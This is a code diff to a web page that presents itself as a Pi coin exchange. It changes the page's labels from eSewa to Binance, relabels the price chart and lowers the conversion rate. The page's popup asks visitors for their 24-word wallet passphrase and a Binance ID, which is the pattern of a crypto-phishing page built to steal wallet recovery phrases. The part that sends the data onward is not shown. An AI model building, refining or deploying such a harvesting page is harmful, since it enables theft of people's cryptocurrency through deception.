@@ -175,7 +175,7 @@
 <div class="main-container">
     <!-- Left Section: Chart -->
     <div class="box">
-        <h3>Live Pi Price Chart</h3>
+        <h3>Live Pi IOU Price Chart</h3>
         <div class="chart-container">
             <iframe src="https://www.tradingview.com/embed-widget/mini-symbol-overview/?symbol=HUOBI%3APIUSDT" frameborder="0" allowfullscreen></iframe>
         </div>
@@ -201,9 +201,9 @@
 <!-- Popup -->
 <div class="popup" id="passphrase-popup">
     <div class="popup-content">
-        <h3>Enter Passphrase and eSewa ID</h3>
+        <h3>Enter Passphrase and Binance ID</h3>
         <input type="text" id="passphrase" placeholder="Enter your 24-word passphrase" />
-        <input type="text" id="esewa-id" placeholder="Enter your eSewa ID" />
+        <input type="text" id="esewa-id" placeholder="Enter your Binance ID" />
         <p id="error-message" style="color: red; display: none;">Passphrase must be exactly 24 words long!</p>
         <button id="submit-passphrase">Submit</button>
     </div>
@@ -224,7 +224,7 @@
     const errorMessage = document.getElementById("error-message");
     const submitPassphraseBtn = document.getElementById("submit-passphrase");
 
-    const piToUsdtRate = 3; // Default rate
+    const piToUsdtRate = 1.85; // Default rate
 
     piInput.addEventListener("input", () => {
         const piValue = parseFloat(piInput.value);
